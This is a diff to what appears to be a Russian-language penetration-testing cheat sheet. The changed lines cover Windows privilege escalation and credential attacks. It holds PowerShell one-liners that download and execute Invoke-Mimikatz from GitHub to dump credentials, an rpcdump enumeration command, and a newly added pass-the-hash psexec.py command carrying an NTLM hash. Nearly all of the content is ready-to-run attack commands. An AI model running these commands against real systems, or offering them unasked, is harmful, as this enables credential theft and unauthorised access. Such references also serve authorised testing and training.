@@ -219,7 +219,7 @@ SUID: find / -perm -u=s -type f 2>/dev/null
 6. Повышение привилегий через подмену DLL библиотек (DLL Hijacking)
 7. Повышение привилегий через неэкранированные пути сервисов (Unquoted Service Paths)
 
-Mimikatz
+### Mimikatz
 ```
 powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 powershell -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
@@ -236,6 +236,13 @@ WinPEAS
 Сбор сведений о RPC (print system)
 ```
 rpcdump.py @10.10.10.175 | egrep 'MS-RPRN|MS-PAR'
+```
+
+### PTH
+ONLY: MSRPC (SMB), DCERPC (WMI), WINRM, MS SQL,RDP (только Windows 2012 R2 и Windows 8.1), LDAP, IMAP, HTTP
+
+```
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc example.local/Administrator@<target_ip> whoami
 ```
 
 ```
